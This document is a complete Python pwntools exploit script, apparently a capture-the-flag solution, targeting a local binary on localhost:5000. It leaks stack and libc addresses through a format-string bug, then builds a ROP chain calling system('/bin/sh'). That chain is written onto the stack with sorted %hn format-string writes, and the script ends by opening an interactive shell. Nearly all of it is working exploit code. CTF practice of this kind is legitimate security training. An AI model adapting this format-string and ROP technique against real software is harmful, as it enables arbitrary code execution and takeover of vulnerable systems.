#!/usr/bin/env python3
from pwn import *

name = './a.out_patched'
# name = './a.out'
elf = context.binary = ELF(name)
libc = elf.libc
context.update(
    log_level='debug',
    terminal="wt.exe -w 0 sp -p kali-linux -- wsl --cd".split() + [os.getcwd()]
    # terminal = "wt.exe wsl -d kali-linux".split()
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcu = lambda x, *args, **kwargs: p.recvuntil(x, *args, **{'drop': True, **kwargs})
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
libx = lambda x: libc.address + x
elx = lambda x: elf.address + x
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.DOCKER:
        pp = remote(HOST, PORT)
        pid = int(subprocess.run(f"pgrep -fx {name}", shell=True, capture_output=True, encoding="utf-8").stdout)
        script = f"""
        set sysroot /proc/{pid}/root
        b* main
        c
        """
        attach(pid, gdbscript=script, sysroot=f"/proc/{pid}/root", exe=name)
        return pp
    elif args.GDB:
        c = '''
        b *main+111
        c
        '''
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

REMOTE = 'nc localhost 5000'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

leak = hleak(rcn(14))

sl(b"%121c%12$hhn|%43$p|%45$p|".ljust(32,b'a')+p64(leak-0x18))

rcu(b'|')
ll = hleak(rcu(b'|'))
pp = hleak(rcu(b'|'))

logi('test', libc.sym.__libc_start_main)
libc.address = ll - libc.sym.__libc_start_main + 0x38 #0x2a578 #0x29ca8
logi('libc', libc.address)


rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

xxx = rop.chain()

payload = b""

for i in range(len(xxx) - 8, -1, -8):
    xx = unpack(xxx[i:i+8], 'all')

    x1 = (xx >> 32) & 0xffff  # +4
    x2 = (xx >> 16) & 0xffff  # +2
    x3 = (xx >>  0) & 0xffff  # +0

    idx = ((i // 8) * 3)
    print(idx)

    writes = [
        (x1, 27 + idx),
        (x2, 26 + idx),
        (x3, 25 + idx),
    ]

    sorted_writes = sorted(writes, key=lambda w: w[0])

    pl = b""
    printed = 0
    for val, pos in sorted_writes:
        inc = (val - printed) & 0xffff
        if inc > 0:
            if pos == 33:
                pl += f"%{inc}c%{pos}$n".encode()
            else:
                pl += f"%{inc}c%{pos}$hn".encode()
        else:
            pl += f"%{pos}$hn".encode()
        printed = val

    pl += f"%{0x10000 - sorted_writes[-1][0]}c".encode()

    payload += pl

payload = payload.ljust(136, b'a') 
payload += p64(leak - 0x140) + p64(leak - 0x140 + 2) + p64(leak - 0x140 + 4)
payload += p64(leak - 0x138) + p64(leak - 0x138 + 2) + p64(leak - 0x138 + 4)
payload += p64(leak - 0x130) + p64(leak - 0x130 + 2) + p64(leak - 0x130 + 4)

print(rop.dump())

sl(payload)

p.interactive()